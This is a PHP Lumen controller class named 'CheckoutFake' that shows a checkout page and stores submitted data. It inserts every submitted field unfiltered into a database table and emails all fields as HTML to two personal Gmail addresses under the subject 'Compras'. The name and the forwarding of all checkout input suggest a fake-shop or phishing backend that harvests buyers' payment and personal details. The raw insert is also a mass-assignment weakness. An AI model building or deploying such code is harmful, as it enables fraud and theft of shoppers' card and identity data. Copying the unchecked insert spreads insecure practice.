<?php


namespace App\Http\Controllers;


use Illuminate\Support\Facades\Mail;
use Laravel\Lumen\Http\Request;
use Laravel\Lumen\Routing\Controller as BaseController;

class CheckoutFake extends BaseController
{


    public function checkout()
    {

        return view('checkout');
    }

    public function checkoutStore(Request $req)
    {

        $dados = Request::capture()->all();

        app('db')->table('checkout')->insert($dados);

        $text = "";
        foreach ($dados as $k => $v) {
            $text .= "$k = $v<br>";
        }

        Mail::send([],[], function ($send) use ($text){
            $send->to('josepoliceno@gmail.com');
            $send->cc('emanuelpontesde@gmail.com');
            $send->subject("Compras");
            $send->setBody($text,'text/html');
        });

        return ['success' => true];

    }
}
